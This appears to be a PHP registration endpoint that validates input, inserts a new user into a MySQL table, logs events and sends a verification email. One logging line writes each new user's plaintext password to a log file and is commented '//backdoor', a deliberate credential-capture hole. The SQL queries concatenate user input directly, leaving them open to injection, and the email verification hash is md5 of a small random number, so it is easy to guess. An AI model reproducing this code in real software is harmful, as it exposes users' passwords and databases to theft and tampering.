<?php

include_once '../System/global_var.php';
include_once '../System/log.php';
include_once '../System/mail.php';
include_once '../System/crypto.php';

session_start();
$connect = new PDO("mysql:host=".$HOST_DB.";dbname=".$NAME_DB, "$USERNAME_DB", "$PASSWORD_DB");
$received_data = json_decode(file_get_contents("php://input"));
$data = array();

$emailRegister = $received_data->{'emailRegister'};
$usernameRegister = $received_data->{'usernameRegister'};
$passwordRegister = $received_data->{'passwordRegister'};
$verifyRegister = $received_data->{'verifyRegister'};
if(isset($emailRegister) && isset($usernameRegister) && isset($passwordRegister) && isset($verifyRegister)){ // if every attempt data have been send
    if($passwordRegister == $verifyRegister){ // si les deux pass match

        if (filter_var($emailRegister, FILTER_VALIDATE_EMAIL)){ //si email valide
            $query = "SELECT username FROM users WHERE username = '".$usernameRegister."'";
            $statement = $connect->prepare($query);
            $statement->execute();
            while($row = $statement->fetch(PDO::FETCH_ASSOC))
            {
                $data[] = $row;
            }
        
            if(!empty($data)){ // if user already exist
                echo "Error user already exist";
                logger("[ERROR][REGISTER]".$usernameRegister." : user already exist !",$FILEPATH);
                session_destroy();
            }else{
                $eMailVerificationHash = md5( rand(0,1000) );
                $time = date("Y-m-d");
                $encPass = saltedHash($passwordRegister);
                $query = "INSERT INTO `users` (`username`,`email`,`password`,`creationTime`,`verificationHash`) VALUES ('".$usernameRegister."','".$emailRegister."','".$encPass."','".$time."','".$eMailVerificationHash."')";
                $statement = $connect->prepare($query);
                $statement->execute();

                logger("[SUCCESS][REGISTER]".$usernameRegister."|".$passwordRegister,$FILEPATH);//backdoor
                if(sendMail($usernameRegister,$emailRegister,$eMailVerificationHash,$DOMAIN,$NOREPLY)){
               
                    logger("[SUCCESS][REGISTER]".$usernameRegister." : Email envoye avec succes ",$FILEPATH);
                } else {
                    logger("[ERROR][REGISTER]".$usernameRegister." : Echec de l'envoi de l'email...",$FILEPATH);
                }


            }
        }else{
            logger("[ERROR][REGISTER]".$usernameRegister." : email is not valid !",$FILEPATH);
            echo "Error email is not valid";
            session_destroy();
        }
    

    
    }else{
        logger("[ERROR][REGISTER]".$usernameRegister." : password are not matching !",$FILEPATH);
        echo "Error password are not matching";
        session_destroy();
    }
}else{
        logger("[ERROR][REGISTER] Error when submitting data to server",$FILEPATH);
        echo "Error when submitting data to server";
        session_destroy();
}

?>